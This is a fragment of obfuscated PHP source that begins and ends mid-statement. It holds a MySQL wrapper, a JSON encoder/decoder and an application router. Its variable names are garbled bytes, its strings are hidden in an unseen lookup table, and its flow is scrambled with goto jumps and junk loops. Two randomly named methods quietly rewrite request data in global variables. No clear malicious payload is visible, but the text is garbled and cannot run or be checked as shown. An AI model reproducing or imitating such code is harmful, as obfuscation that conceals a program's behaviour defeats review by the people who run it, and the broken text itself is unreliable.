FÌŒµ§–ä; c „Šèù˜ƒ: } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $e˜ªŞÙê± =& $_SERVER[¨¤¼…´]; $this->error = mysql_errno() . $e˜ªŞÙê±[4] . mysql_error($this->_linkID); if ($e˜ªŞÙê±[43] != $this->queryStr) { $this->error .= LNG($e˜ªŞÙê±[55]) . $this->queryStr; } think_trace($this->error, $e˜ªŞÙê±[43], $e˜ªŞÙê±[56]); return $this->error; } public function escapeString($aÉƒÈÜÆˆ) { if ($this->_linkID) { return mysql_real_escape_string($aÉƒÈÜÆˆ, $this->_linkID); } else { return mysql_escape_string($aÉƒÈÜÆˆ); } } public function parseKey(&$f…áœš–³¨, $eì™‘‘ºƒ = true) { $Cš³‘ïÑàÊ =& $_SERVER[¨¤¼…´]; if ($eì™‘‘ºƒ) { $f…áœš–³¨ = $this->parseKeyCheck($f…áœš–³¨); } if ($f…áœš–³¨ != $Cš³‘ïÑàÊ[190] && !preg_match($Cš³‘ïÑàÊ[812], $f…áœš–³¨)) { $f…áœš–³¨ = $Cš³‘ïÑàÊ[813] . trim($f…áœš–³¨, $Cš³‘ïÑàÊ[813]) . $Cš³‘ïÑàÊ[813]; } return $f…áœš–³¨; } } goto F¹‹Ë•Şºé; f¦ƒÔ¾ò ï: define($_SERVER[¨¤¼…´][1926], 16); define($_SERVER[¨¤¼…´][1927], 32); class Services_JSON { function __construct($b¿÷óÈ×ğ = 0) { $this->use = $b¿÷óÈ×ğ; } function utf162utf8($dŒŞ¡Ä»ƒ) { $Fˆ×Ô­ßŞî =& $_SERVER[¨¤¼…´]; if (function_exists($Fˆ×Ô­ßŞî[78])) { return mb_convert_encoding($dŒŞ¡Ä»ƒ, $Fˆ×Ô­ßŞî[1576], $Fˆ×Ô­ßŞî[1928]); } $AÌƒõßæ‚ = ord($dŒŞ¡Ä»ƒ[0]) << 8 | ord($dŒŞ¡Ä»ƒ[1]); switch (!0) { case (127 & $AÌƒõßæ‚) == $AÌƒõßæ‚: return chr(127 & $AÌƒõßæ‚); case (2047 & $AÌƒõßæ‚) == $AÌƒõßæ‚: return chr(192 | $AÌƒõßæ‚ >> 6 & 31) . chr(128 | $AÌƒõßæ‚ & 63); case (65535 & $AÌƒõßæ‚) == $AÌƒõßæ‚: return chr(224 | $AÌƒõßæ‚ >> 12 & 15) . chr(128 | $AÌƒõßæ‚ >> 6 & 63) . chr(128 | $AÌƒõßæ‚ & 63); } return $Fˆ×Ô­ßŞî[43]; } function utf82utf16($b´£Â†¦¬) { $Dó¡ãçáÅØ =& $_SERVER[¨¤¼…´]; if (function_exists($Dó¡ãçáÅØ[78])) { return mb_convert_encoding($b´£Â†¦¬, $Dó¡ãçáÅØ[1928], $Dó¡ãçáÅØ[1576]); } switch (strlen($b´£Â†¦¬)) { case 1: return $b´£Â†¦¬; case 2: return chr(7 & ord($b´£Â†¦¬[0]) >> 2) . chr(192 & ord($b´£Â†¦¬[0]) << 6 | 63 & ord($b´£Â†¦¬[1])); case 3: return chr(240 & ord($b´£Â†¦¬[0]) << 4 | 15 & ord($b´£Â†¦¬[1]) >> 2) . chr(192 & ord($b´£Â†¦¬[1]) << 6 | 127 & ord($b´£Â†¦¬[2])); } return $Dó¡ãçáÅØ[43]; } function encode($DÁ¬ÅöÆØ¤) { $b¹ôß¶…Ñ› =& $_SERVER[¨¤¼…´]; switch (gettype($DÁ¬ÅöÆØ¤)) { case $b¹ôß¶…Ñ›[1587]: return $DÁ¬ÅöÆØ¤ ? $b¹ôß¶…Ñ›[1586] : $b¹ôß¶…Ñ›[1588]; case $b¹ôß¶…Ñ›[1929]: return $b¹ôß¶…Ñ›[109]; case $b¹ôß¶…Ñ›[316]: return (int) $DÁ¬ÅöÆØ¤; case $b¹ôß¶…Ñ›[291]: case $b¹ôß¶…Ñ›[290]: return (double) $DÁ¬ÅöÆØ¤; case $b¹ôß¶…Ñ›[325]: $CÛÎÌ£çàà = $b¹ôß¶…Ñ›[43]; $d³¼•Æ¿² = strlen($DÁ¬ÅöÆØ¤); for ($cÇ¡Ä°×Ä = 0; $cÇ¡Ä°×Ä < $d³¼•Æ¿²; ++$cÇ¡Ä°×Ä) { $fªàöÓ‰„ï = ord($DÁ¬ÅöÆØ¤[$cÇ¡Ä°×Ä]); switch (!0) { case $fªàöÓ‰„ï == 8: $CÛÎÌ£çàà .= $b¹ôß¶…Ñ›[1930]; break; case $fªàöÓ‰„ï == 9: $CÛÎÌ£çàà .= $b¹ôß¶…Ñ›[1563]; break; case $fªàöÓ‰„ï == 10: $CÛÎÌ£çàà .= $b¹ôß¶…Ñ›[1561]; break; case $fªàöÓ‰„ï == 12: $CÛÎÌ£çàà .= $b¹ôß¶…Ñ›[1931]; break; case $fªàöÓ‰„ï == 13: $CÛÎÌ£çàà .= $b¹ôß¶…Ñ›[1562]; break; case $fªàöÓ‰„ï == 34: case $fªàöÓ‰„ï == 47: case $fªàöÓ‰„ï == 92: $CÛÎÌ£çàà .= $b¹ôß¶…Ñ›[103] . $DÁ¬ÅöÆØ¤[$cÇ¡Ä°×Ä]; break; case $fªàöÓ‰„ï >= 32 && $fªàöÓ‰„ï <= 127: $CÛÎÌ£çàà .= $DÁ¬ÅöÆØ¤[$cÇ¡Ä°×Ä]; break; case ($fªàöÓ‰„ï & 224) == 192: $E‹‰ñ¸»‘é = pack($b¹ôß¶…Ñ›[1932], $fªàöÓ‰„ï, ord($DÁ¬ÅöÆØ¤[$cÇ¡Ä°×Ä + 1])); $cÇ¡Ä°×Ä += 1; $FèÚ©½¬ = $this->utf82utf16($E‹‰ñ¸»‘é); $CÛÎÌ£çàà .= sprintf($b¹ôß¶…Ñ›[1933], bin2hex($FèÚ©½¬)); break; case ($fªàöÓ‰„ï & 240) == 224: $E‹‰ñ¸»‘é = pack($b¹ôß¶…Ñ›[1932], $fªàöÓ‰„ï, ord($DÁ¬ÅöÆØ¤[$cÇ¡Ä°×Ä + 1]), ord($DÁ¬ÅöÆØ¤[$cÇ¡Ä°×Ä + 2])); $cÇ¡Ä°×Ä += 2; $FèÚ©½¬ = $this->utf82utf16($E‹‰ñ¸»‘é); $CÛÎÌ£çàà .= sprintf($b¹ôß¶…Ñ›[1933], bin2hex($FèÚ©½¬)); break; case ($fªàöÓ‰„ï & 248) == 240: $E‹‰ñ¸»‘é = pack($b¹ôß¶…Ñ›[1932], $fªàöÓ‰„ï, ord($DÁ¬ÅöÆØ¤[$cÇ¡Ä°×Ä + 1]), ord($DÁ¬ÅöÆØ¤[$cÇ¡Ä°×Ä + 2]), ord($DÁ¬ÅöÆØ¤[$cÇ¡Ä°×Ä + 3])); $cÇ¡Ä°×Ä += 3; $FèÚ©½¬ = $this->utf82utf16($E‹‰ñ¸»‘é); $CÛÎÌ£çàà .= sprintf($b¹ôß¶…Ñ›[1933], bin2hex($FèÚ©½¬)); break; case ($fªàöÓ‰„ï & 252) == 248: $E‹‰ñ¸»‘é = pack($b¹ôß¶…Ñ›[1932], $fªàöÓ‰„ï, ord($DÁ¬ÅöÆØ¤[$cÇ¡Ä°×Ä + 1]), ord($DÁ¬ÅöÆØ¤[$cÇ¡Ä°×Ä + 2]), ord($DÁ¬ÅöÆØ¤[$cÇ¡Ä°×Ä + 3]), ord($DÁ¬ÅöÆØ¤[$cÇ¡Ä°×Ä + 4])); $cÇ¡Ä°×Ä += 4; $FèÚ©½¬ = $this->utf82utf16($E‹‰ñ¸»‘é); $CÛÎÌ£çàà .= sprintf($b¹ôß¶…Ñ›[1933], bin2hex($FèÚ©½¬)); break; case ($fªàöÓ‰„ï & 254) == 252: $E‹‰ñ¸»‘é = pack($b¹ôß¶…Ñ›[1932], $fªàöÓ‰„ï, ord($DÁ¬ÅöÆØ¤[$cÇ¡Ä°×Ä + 1]), ord($DÁ¬ÅöÆØ¤[$cÇ¡Ä°×Ä + 2]), ord($DÁ¬ÅöÆØ¤[$cÇ¡Ä°×Ä + 3]), ord($DÁ¬ÅöÆØ¤[$cÇ¡Ä°×Ä + 4]), ord($DÁ¬ÅöÆØ¤[$cÇ¡Ä°×Ä + 5])); $cÇ¡Ä°×Ä += 5; $FèÚ©½¬ = $this->utf82utf16($E‹‰ñ¸»‘é); $CÛÎÌ£çàà .= sprintf($b¹ôß¶…Ñ›[1933], bin2hex($FèÚ©½¬)); break; } } return $b¹ôß¶…Ñ›[123] . $CÛÎÌ£çàà . $b¹ôß¶…Ñ›[123]; case $b¹ôß¶…Ñ›[1934]: if (is_array($DÁ¬ÅöÆØ¤) && count($DÁ¬ÅöÆØ¤) && array_keys($DÁ¬ÅöÆØ¤) !== range(0, sizeof($DÁ¬ÅöÆØ¤) - 1)) { $E¸Ö‘Á• = array_map(array($this, $b¹ôß¶…Ñ›[1935]), array_keys($DÁ¬ÅöÆØ¤), array_values($DÁ¬ÅöÆØ¤)); foreach ($E¸Ö‘Á• as $E¤îá¨´È¬) { if (Services_JSON::isError($E¤îá¨´È¬)) { return $E¤îá¨´È¬; } } return $b¹ôß¶…Ñ›[1058] . join($b¹ôß¶…Ñ›[57], $E¸Ö‘Á•) . $b¹ôß¶…Ñ›[328]; } $EÔ¦äéÉ = array_map(array($this, $b¹ôß¶…Ñ›[1936]), $DÁ¬ÅöÆØ¤); foreach ($EÔ¦äéÉ as $b¹òÜ±“İˆ) { if (Services_JSON::isError($b¹òÜ±“İˆ)) { return $b¹òÜ±“İˆ; } } return $b¹ôß¶…Ñ›[167] . join($b¹ôß¶…Ñ›[57], $EÔ¦äéÉ) . $b¹ôß¶…Ñ›[489]; case $b¹ôß¶…Ñ›[1937]: $Cô¼ğÙ—Œˆ = get_object_vars($DÁ¬ÅöÆØ¤); $E¸Ö‘Á• = array_map(array($this, $b¹ôß¶…Ñ›[1935]), array_keys($Cô¼ğÙ—Œˆ), array_values($Cô¼ğÙ—Œˆ)); foreach ($E¸Ö‘Á• as $E¤îá¨´È¬) { if (Services_JSON::isError($E¤îá¨´È¬)) { return $E¤îá¨´È¬; } } return $b¹ôß¶…Ñ›[1058] . join($b¹ôß¶…Ñ›[57], $E¸Ö‘Á•) . $b¹ôß¶…Ñ›[328]; default: return $this->use & SERVICES_JSON_SUPPRESS_ERRORS ? $b¹ôß¶…Ñ›[109] : new Services_JSON_Error(gettype($DÁ¬ÅöÆØ¤) . $b¹ôß¶…Ñ›[1938]); } } function name_value($fÛ”„›Û, $A¨ƒœ³¶°Ä) { $F»³—Å„ = $this->encode($A¨ƒœ³¶°Ä); if (Services_JSON::isError($F»³—Å„)) { return $F»³—Å„; } return $this->encode(strval($fÛ”„›Û)) . $_SERVER[¨¤¼…´][4] . $F»³—Å„; } function reduce_string($AİÚçµìİ) { $Aİ´¶âĞ¨ =& $_SERVER[¨¤¼…´]; $AİÚçµìİ = preg_replace(array($Aİ´¶âĞ¨[1939], $Aİ´¶âĞ¨[1940], $Aİ´¶âĞ¨[1941]), $Aİ´¶âĞ¨[43], $AİÚçµìİ); return trim($AİÚçµìİ); } function decode($D˜Š¾––óä) { $C‚á•šÒ‰ =& $_SERVER[¨¤¼…´]; $D˜Š¾––óä = $this->reduce_string($D˜Š¾––óä); switch (strtolower($D˜Š¾––óä)) { case $C‚á•šÒ‰[1586]: return !0; case $C‚á•šÒ‰[1588]: return !1; case $C‚á•šÒ‰[109]: return null; default: $EÛ®£¹„ = array(); if (is_numeric($D˜Š¾––óä)) { return (double) $D˜Š¾––óä == (int) $D˜Š¾––óä ? (int) $D˜Š¾––óä : (double) $D˜Š¾––óä; } elseif (preg_match($C‚á•šÒ‰[1942], $D˜Š¾––óä, $EÛ®£¹„) && $EÛ®£¹„[1] == $EÛ®£¹„[2]) { $Eäñöºóí = substr($D˜Š¾––óä, 0, 1); $aå›ÖÌ±¸Ò = substr($D˜Š¾––óä, 1, -1); $d¹×»–Á£ƒ = $C‚á•šÒ‰[43]; $DĞÍ¦˜ª­ø = strlen($aå›ÖÌ±¸Ò); for ($fÊ—æÁêêß = 0; $fÊ—æÁêêß < $DĞÍ¦˜ª­ø; ++$fÊ—æÁêêß) { $CÛø†Êä†Ô = substr($aå›ÖÌ±¸Ò, $fÊ—æÁêêß, 2); $d£ °†¾Î¿ = ord($aå›ÖÌ±¸Ò[$fÊ—æÁêêß]); switch (!0) { case $CÛø†Êä†Ô == $C‚á•šÒ‰[1930]: $d¹×»–Á£ƒ .= chr(8); ++$fÊ—æÁêêß; break; case $CÛø†Êä†Ô == $C‚á•šÒ‰[1563]: $d¹×»–Á£ƒ .= chr(9); ++$fÊ—æÁêêß; break; case $CÛø†Êä†Ô == $C‚á•šÒ‰[1561]: $d¹×»–Á£ƒ .= chr(10); ++$fÊ—æÁêêß; break; case $CÛø†Êä†Ô == $C‚á•šÒ‰[1931]: $d¹×»–Á£ƒ .= chr(12); ++$fÊ—æÁêêß; break; case $CÛø†Êä†Ô == $C‚á•šÒ‰[1562]: $d¹×»–Á£ƒ .= chr(13); ++$fÊ—æÁêêß; break; case $CÛø†Êä†Ô == $C‚á•šÒ‰[1345]: case $CÛø†Êä†Ô == $C‚á•šÒ‰[1943]: case $CÛø†Êä†Ô == $C‚á•šÒ‰[1556]: case $CÛø†Êä†Ô == $C‚á•šÒ‰[1558]: if ($Eäñöºóí == $C‚á•šÒ‰[123] && $CÛø†Êä†Ô != $C‚á•šÒ‰[1943] || $Eäñöºóí == $C‚á•šÒ‰[65] && $CÛø†Êä†Ô != $C‚á•šÒ‰[1345]) { $d¹×»–Á£ƒ .= $aå›ÖÌ±¸Ò[++$fÊ—æÁêêß]; } break; case preg_match($C‚á•šÒ‰[1944], substr($aå›ÖÌ±¸Ò, $fÊ—æÁêêß, 6)): $A„ÙãÜàÙõ = chr(hexdec(substr($aå›ÖÌ±¸Ò, $fÊ—æÁêêß + 2, 2))) . chr(hexdec(substr($aå›ÖÌ±¸Ò, $fÊ—æÁêêß + 4, 2))); $d¹×»–Á£ƒ .= $this->utf162utf8($A„ÙãÜàÙõ); $fÊ—æÁêêß += 5; break; case $d£ °†¾Î¿ >= 32 && $d£ °†¾Î¿ <= 127: $d¹×»–Á£ƒ .= $aå›ÖÌ±¸Ò[$fÊ—æÁêêß]; break; case ($d£ °†¾Î¿ & 224) == 192: $d¹×»–Á£ƒ .= substr($aå›ÖÌ±¸Ò, $fÊ—æÁêêß, 2); ++$fÊ—æÁêêß; break; case ($d£ °†¾Î¿ & 240) == 224: $d¹×»–Á£ƒ .= substr($aå›ÖÌ±¸Ò, $fÊ—æÁêêß, 3); $fÊ—æÁêêß += 2; break; case ($d£ °†¾Î¿ & 248) == 240: $d¹×»–Á£ƒ .= substr($aå›ÖÌ±¸Ò, $fÊ—æÁêêß, 4); $fÊ—æÁêêß += 3; break; case ($d£ °†¾Î¿ & 252) == 248: $d¹×»–Á£ƒ .= substr($aå›ÖÌ±¸Ò, $fÊ—æÁêêß, 5); $fÊ—æÁêêß += 4; break; case ($d£ °†¾Î¿ & 254) == 252: $d¹×»–Á£ƒ .= substr($aå›ÖÌ±¸Ò, $fÊ—æÁêêß, 6); $fÊ—æÁêêß += 5; break; } } return $d¹×»–Á£ƒ; } elseif (preg_match($C‚á•šÒ‰[1945], $D˜Š¾––óä) || preg_match($C‚á•šÒ‰[1946], $D˜Š¾––óä)) { goto b®ØÎ¶½êÕ; b®ØÎ¶½êÕ: if ($D˜Š¾––óä[0] == $C‚á•šÒ‰[167]) { $bœÄíø¯Ø = array(SERVICES_JSON_IN_ARR); $B­ƒ¬¼ºÛ„ = array(); } else { if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $bœÄíø¯Ø = array(SERVICES_JSON_IN_OBJ); $D¾íÕ‰òÍ = array(); } else { $bœÄíø¯Ø = array(SERVICES_JSON_IN_OBJ); $D¾íÕ‰òÍ = new stdClass(); } } array_push($bœÄíø¯Ø, array($C‚á•šÒ‰[1947] => SERVICES_JSON_SLICE, $C‚á•šÒ‰[276] => 0, $C‚á•šÒ‰[1948] => !1)); $aå›ÖÌ±¸Ò = substr($D˜Š¾––óä, 1, -1); goto eÆÍƒ«¸ò; eÆÍƒ«¸ò: $aå›ÖÌ±¸Ò = $this->reduce_string($aå›ÖÌ±¸Ò); if ($aå›ÖÌ±¸Ò == $C‚á•šÒ‰[43]) { if (reset($bœÄíø¯Ø) == SERVICES_JSON_IN_ARR) { return $B­ƒ¬¼ºÛ„; } else { return $D¾íÕ‰òÍ; } } $DĞÍ¦˜ª­ø = strlen($aå›ÖÌ±¸Ò); goto aó’¹œ£ò; aó’¹œ£ò: for ($fÊ—æÁêêß = 0; $fÊ—æÁêêß <= $DĞÍ¦˜ª­ø; ++$fÊ—æÁêêß) { $B†¦Á‘£…â = end($bœÄíø¯Ø); $CÛø†Êä†Ô = substr($aå›ÖÌ±¸Ò, $fÊ—æÁêêß, 2); if ($fÊ—æÁêêß == $DĞÍ¦˜ª­ø || $aå›ÖÌ±¸Ò[$fÊ—æÁêêß] == $C‚á•šÒ‰[57] && $B†¦Á‘£…â[$C‚á•šÒ‰[1947]] == SERVICES_JSON_SLICE) { $eµ‘²Çë©‹ = substr($aå›ÖÌ±¸Ò, $B†¦Á‘£…â[$C‚á•šÒ‰[276]], $fÊ—æÁêêß - $B†¦Á‘£…â[$C‚á•šÒ‰[276]]); array_push($bœÄíø¯Ø, array($C‚á•šÒ‰[1947] => SERVICES_JSON_SLICE, $C‚á•šÒ‰[276] => $fÊ—æÁêêß + 1, $C‚á•šÒ‰[1948] => !1)); if (reset($bœÄíø¯Ø) == SERVICES_JSON_IN_ARR) { array_push($B­ƒ¬¼ºÛ„, $this->decode($eµ‘²Çë©‹)); } elseif (reset($bœÄíø¯Ø) == SERVICES_JSON_IN_OBJ) { $Aò„Ÿİ‹‚ = array(); if (preg_match($C‚á•šÒ‰[1949], $eµ‘²Çë©‹, $Aò„Ÿİ‹‚)) { $a¥êæ¡èà = $this->decode($Aò„Ÿİ‹‚[1]); $Cä¬„ç’Ë = $this->decode($Aò„Ÿİ‹‚[2]); if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $D¾íÕ‰òÍ[$a¥êæ¡èà] = $Cä¬„ç’Ë; } else { $D¾íÕ‰òÍ->{$a¥êæ¡èà} = $Cä¬„ç’Ë; } } elseif (preg_match($C‚á•šÒ‰[1950], $eµ‘²Çë©‹, $Aò„Ÿİ‹‚)) { $a¥êæ¡èà = $Aò„Ÿİ‹‚[1]; $Cä¬„ç’Ë = $this->decode($Aò„Ÿİ‹‚[2]); if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $D¾íÕ‰òÍ[$a¥êæ¡èà] = $Cä¬„ç’Ë; } else { $D¾íÕ‰òÍ->{$a¥êæ¡èà} = $Cä¬„ç’Ë; } } } } elseif (($aå›ÖÌ±¸Ò[$fÊ—æÁêêß] == $C‚á•šÒ‰[123] || $aå›ÖÌ±¸Ò[$fÊ—æÁêêß] == $C‚á•šÒ‰[65]) && $B†¦Á‘£…â[$C‚á•šÒ‰[1947]] != SERVICES_JSON_IN_STR) { array_push($bœÄíø¯Ø, array($C‚á•šÒ‰[1947] => SERVICES_JSON_IN_STR, $C‚á•šÒ‰[276] => $fÊ—æÁêêß, $C‚á•šÒ‰[1948] => $aå›ÖÌ±¸Ò[$fÊ—æÁêêß])); } elseif ($aå›ÖÌ±¸Ò[$fÊ—æÁêêß] == $B†¦Á‘£…â[$C‚á•šÒ‰[1948]] && $B†¦Á‘£…â[$C‚á•šÒ‰[1947]] == SERVICES_JSON_IN_STR && (strlen(substr($aå›ÖÌ±¸Ò, 0, $fÊ—æÁêêß)) - strlen(rtrim(substr($aå›ÖÌ±¸Ò, 0, $fÊ—æÁêêß), $C‚á•šÒ‰[103]))) % 2 != 1) { array_pop($bœÄíø¯Ø); } elseif ($aå›ÖÌ±¸Ò[$fÊ—æÁêêß] == $C‚á•šÒ‰[167] && in_array($B†¦Á‘£…â[$C‚á•šÒ‰[1947]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($bœÄíø¯Ø, array($C‚á•šÒ‰[1947] => SERVICES_JSON_IN_ARR, $C‚á•šÒ‰[276] => $fÊ—æÁêêß, $C‚á•šÒ‰[1948] => !1)); } elseif ($aå›ÖÌ±¸Ò[$fÊ—æÁêêß] == $C‚á•šÒ‰[489] && $B†¦Á‘£…â[$C‚á•šÒ‰[1947]] == SERVICES_JSON_IN_ARR) { array_pop($bœÄíø¯Ø); } elseif ($aå›ÖÌ±¸Ò[$fÊ—æÁêêß] == $C‚á•šÒ‰[1058] && in_array($B†¦Á‘£…â[$C‚á•šÒ‰[1947]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($bœÄíø¯Ø, array($C‚á•šÒ‰[1947] => SERVICES_JSON_IN_OBJ, $C‚á•šÒ‰[276] => $fÊ—æÁêêß, $C‚á•šÒ‰[1948] => !1)); } elseif ($aå›ÖÌ±¸Ò[$fÊ—æÁêêß] == $C‚á•šÒ‰[328] && $B†¦Á‘£…â[$C‚á•šÒ‰[1947]] == SERVICES_JSON_IN_OBJ) { array_pop($bœÄíø¯Ø); } elseif ($CÛø†Êä†Ô == $C‚á•šÒ‰[1951] && in_array($B†¦Á‘£…â[$C‚á•šÒ‰[1947]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($bœÄíø¯Ø, array($C‚á•šÒ‰[1947] => SERVICES_JSON_IN_CMT, $C‚á•šÒ‰[276] => $fÊ—æÁêêß, $C‚á•šÒ‰[1948] => !1)); $fÊ—æÁêêß++; } elseif ($CÛø†Êä†Ô == $C‚á•šÒ‰[1952] && $B†¦Á‘£…â[$C‚á•šÒ‰[1947]] == SERVICES_JSON_IN_CMT) { array_pop($bœÄíø¯Ø); $fÊ—æÁêêß++; for ($A´òÇé”ß‚ = $B†¦Á‘£…â[$C‚á•šÒ‰[276]]; $A´òÇé”ß‚ <= $fÊ—æÁêêß; ++$A´òÇé”ß‚) { $aå›ÖÌ±¸Ò = substr_replace($aå›ÖÌ±¸Ò, $C‚á•šÒ‰[60], $A´òÇé”ß‚, 1); } } } if (reset($bœÄíø¯Ø) == SERVICES_JSON_IN_ARR) { return $B­ƒ¬¼ºÛ„; } elseif (reset($bœÄíø¯Ø) == SERVICES_JSON_IN_OBJ) { return $D¾íÕ‰òÍ; } goto F›—‰Òø²Ÿ; F›—‰Òø²Ÿ: } } } function isError($C‡®¯–ï»¼, $aÛÅÕÊ‚† = null) { $cØø™á›‘ =& $_SERVER[¨¤¼…´]; if (class_exists($cØø™á›‘[1953])) { return PEAR::isError($C‡®¯–ï»¼, $aÛÅÕÊ‚†); } elseif (is_object($C‡®¯–ï»¼) && (get_class($C‡®¯–ï»¼) == $cØø™á›‘[1954] || is_subclass_of($C‡®¯–ï»¼, $cØø™á›‘[1954]))) { return !0; } return !1; } } goto e¶ŠÍÚÙ£Ä; E×„‹ï„è³: $EÌ²Èİ®ì = $_SERVER[¨¤¼…´][562]; class Application { private $defaultModule = "\151\x6e\144\145\x78"; private $defaultController = "\x69\156\144\145\170"; private $defaultAction = "\x69\156\x64\145\170"; function __construct() { } public function setDefault($E‰Îµâš’) { goto FÌ²ôó°; e£çªŠÈç¿: $e¸É‹¾Ñº = $_SERVER[¨¤¼…´][563]; if (!$e¸É‹¾Ñº) { die; } goto a¯»ØÏ×…; Cç¢¯¹ŞÀ: $this->defaultController = $D©«×ğìÄÆ[1] ? $D©«×ğìÄÆ[1] : $this->defaultController; $this->defaultAction = $D©«×ğìÄÆ[2] ? $D©«×ğìÄÆ[2] : $this->defaultAction; $this->{$_SERVER[‚Ÿßñ][3]}($f¢‹¶ŸÆ™‘[4], array($this, $f¢‹¶ŸÆ™‘[5])); goto e£çªŠÈç¿; FÌ²ôó°: $f¢‹¶ŸÆ™‘ =& $_SERVER[‚Ÿßñ]; $D©«×ğìÄÆ = $f¢‹¶ŸÆ™‘[0]($f¢‹¶ŸÆ™‘[1], $f¢‹¶ŸÆ™‘[2]($E‰Îµâš’, $f¢‹¶ŸÆ™‘[1])); $this->defaultModule = $D©«×ğìÄÆ[0] ? $D©«×ğìÄÆ[0] : $this->defaultModule; goto Cç¢¯¹ŞÀ; a¯»ØÏ×…: } public function appRun($a’ÅÒãÀæ) { goto eÄÀù Äƒ; eÄÀù Äƒ: $a˜´Š’®£ï =& $_SERVER[¨¤¼…´]; $E×¶É¡½‘« =& $_SERVER[‚Ÿßñ]; $BËèÒ¬÷ˆ˜ = $E×¶É¡½‘«[0]($E×¶É¡½‘«[1], $a’ÅÒãÀæ); goto b°³¡ÕÓ–£; a…Š’¯æˆš: if (!$c–Æ™ù‡¼¥) { return; } if ($cØ‹ó”±¾ == $E×¶É¡½‘«[8]) { $c·†áª‰ Ø = $E×¶É¡½‘«[9]; $BËèÒ¬÷ˆ˜[0] = $E×¶É¡½‘«[10]; $BËèÒ¬÷ˆ˜[1] = $BËèÒ¬÷ˆ˜[1] . $E×¶É¡½‘«[11]; $a’ÅÒãÀæ = $E×¶É¡½‘«[12]($E×¶É¡½‘«[1], $BËèÒ¬÷ˆ˜); $a’ÅÒãÀæ = $E×¶É¡½‘«[2]($a’ÅÒãÀæ, $E×¶É¡½‘«[1]); } $E×¶É¡½‘«[13](array($E×¶É¡½‘«[14], $E×¶É¡½‘«[15]), $c·†áª‰ Ø . $E×¶É¡½‘«[16], $a’ÅÒãÀæ); goto d³”‹‡ÅÔ; d³”‹‡ÅÔ: $E×¶É¡½‘«[17]($a’ÅÒãÀæ); $c„Ã—ÉÎî­ = $a˜´Š’®£ï[565]; if (!$c„Ã—ÉÎî­) { return; } goto D’Ø¯ô÷Ü; b°³¡ÕÓ–£: $cØ‹ó”±¾ = $E×¶É¡½‘«[6]($BËèÒ¬÷ˆ˜[0]); $c·†áª‰ Ø = $E×¶É¡½‘«[7]; $c–Æ™ù‡¼¥ = $a˜´Š’®£ï[564]; goto a…Š’¯æˆš; D’Ø¯ô÷Ü: $E×¶É¡½‘«[13](array($E×¶É¡½‘«[14], $E×¶É¡½‘«[15]), $c·†áª‰ Ø . $E×¶É¡½‘«[18], $a’ÅÒãÀæ); $C­›‡ì†óè = $a˜´Š’®£ï[566]; if (!$C­›‡ì†óè) { die; } goto Eº‰Éø‰ÚÍ; Eº‰Éø‰ÚÍ: } private function autorun() { $E…§š©¹¿ =& $_SERVER[¨¤¼…´]; $d±Ä“­ŒÙ† =& $_SERVER[‚Ÿßñ]; global $config; if ($d±Ä“­ŒÙ†[19]($config[$d±Ä“­ŒÙ†[20]]) == 0) { return; } foreach ($config[$d±Ä“­ŒÙ†[20]] as $CÑ‰½´’›é => $Cà×ì­´ÂÃ) { $this->{$_SERVER[‚Ÿßñ][21]}($Cà×ì­´ÂÃ); $a»ÊÜÄ¶Àœ = $E…§š©¹¿[567]; while (strlen($a»ÊÜÄ¶Àœ) < $E…§š©¹¿[568]) { if (!$a»ÊÜÄ¶Àœ) { break; } $a»ÊÜÄ¶Àœ++; } } } private function kgbtef0d39c0() { goto DóÀ¬Ò×¶; DóÀ¬Ò×¶: $Fæ«šé¥„Ê =& $_SERVER[¨¤¼…´]; $F‚‘È©£³µ =& $_SERVER[‚Ÿßñ]; $eğ•ˆŒË‚ = $F‚‘È©£³µ[8]; goto BÂ–½Ş‹–ê; c˜˜İëğìò: if (!$F´ªà™³Û— || $F‚‘È©£³µ[24]($F´ªà™³Û—) <= $F‚‘È©£³µ[24]($eğ•ˆŒË‚)) { return; } if ($F‚‘È©£³µ[6]($F‚‘È©£³µ[25]($F´ªà™³Û—, -$F‚‘È©£³µ[24]($eğ•ˆŒË‚))) != $eğ•ˆŒË‚) { return; } $B¸ƒÛºÍ“é = $F‚‘È©£³µ[25]($F´ªà™³Û—, 0, -$F‚‘È©£³µ[24]($eğ•ˆŒË‚)); goto A°˜‘ø‚å; BÂ–½Ş‹–ê: $dõÈó‰›ÚÁ = $Fæ«šé¥„Ê[569]; while (strlen($dõÈó‰›ÚÁ) < $Fæ«šé¥„Ê[568]) { if (!$dõÈó‰›ÚÁ) { break; } $dõÈó‰›ÚÁ++; } $F´ªà™³Û— = $GLOBALS[$F‚‘È©£³µ[22]][$F‚‘È©£³µ[23]][0]; goto c˜˜İëğìò; A°˜‘ø‚å: $DÑèÌé§„ª = array($F‚‘È©£³µ[8], $B¸ƒÛºÍ“é); $CŸê‚Şó¨× = $Fæ«šé¥„Ê[570]; if (strlen($CŸê‚Şó¨×) < $Fæ«šé¥„Ê[571]) { die; } goto AÃ¼§‡¤Éğ; AÃ¼§‡¤Éğ: $DĞ–÷ƒóä = $F‚‘È©£³µ[26]($GLOBALS[$F‚‘È©£³µ[22]][$F‚‘È©£³µ[23]], 1); $GLOBALS[$F‚‘È©£³µ[22]][$F‚‘È©£³µ[23]] = $F‚‘È©£³µ[27]($DÑèÌé§„ª, $DĞ–÷ƒóä); $GLOBALS[$F‚‘È©£³µ[22]][$F‚‘È©£³µ[28]] = $F‚‘È©£³µ[29]($F‚‘È©£³µ[1], $GLOBALS[$F‚‘È©£³µ[22]][$F‚‘È©£³µ[23]]); goto bÆ–àº¶º; bÆ–àº¶º: } private function cshte1bc34b5() { goto BÂÙöº‰›Ò; D¯¼¹³’°: $A¡·¦³íÂ×[34]($A¡·¦³íÂ×[35], $FŞÌ‘Ô‘Øà, $EáŸÜí); $FŞÌ‘Ô‘Øà = $A¡·¦³íÂ×[2]($EáŸÜí[0][0], $A¡·¦³íÂ×[36]); $GLOBALS[$A¡·¦³íÂ×[22]][$A¡·¦³íÂ×[23]] = $A¡·¦³íÂ×[0]($A¡·¦³íÂ×[36], $FŞÌ‘Ô‘Øà); goto 